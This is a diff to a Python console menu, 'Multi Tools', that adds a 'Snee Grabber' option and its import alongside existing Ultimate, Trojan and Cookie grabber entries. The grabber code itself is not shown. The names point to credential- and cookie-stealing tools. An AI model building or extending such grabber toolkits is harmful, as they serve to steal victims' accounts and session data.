@@ -1,13 +1,13 @@
 import os
 import json
-from datetime import date
-from requests import get, post
-from random import randint
 import time
-from colorama import Fore, Style, init
+import ctypes
+from datetime import date
+from random import randint
+from colorama import Fore, Style
 from data.scripts.discord_tools import dc_tools
 from data.scripts.tutorial import tuto
-import ctypes
+from data.grabber_scripts.snee_grabber import snee
 
 ctypes.windll.kernel32.SetConsoleTitleW("Multi Tools v1.6 | https://github.com/itssnee/multi-tools ")
 
@@ -79,6 +79,7 @@ def grabbers():
   [2] Ultimate Grabber
   [3] Trojan Grabber
   [4] Cookie Grabber
+  [5] Snee Grabber
   [0] Back
   """)
   USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
@@ -99,6 +100,8 @@ def grabbers():
        input("currently in development, press enter to restart...")
        clearcmd()
        grabbers()
+  elif USER_OPTION2 == "5":
+       snee()
 
 def zyzz():
   print(bcolors.OKBLUE + "Today's date:",today)
@@ -147,7 +150,7 @@ def zyzz():
     github.com/itssens
     """)
     time.sleep(2.00)
-    input("to restart the program, press enter.")
+    input(bcolors.OKBLUE + "to restart the program, press enter.")
     clearcmd()
     zyzz()
 zyzz()
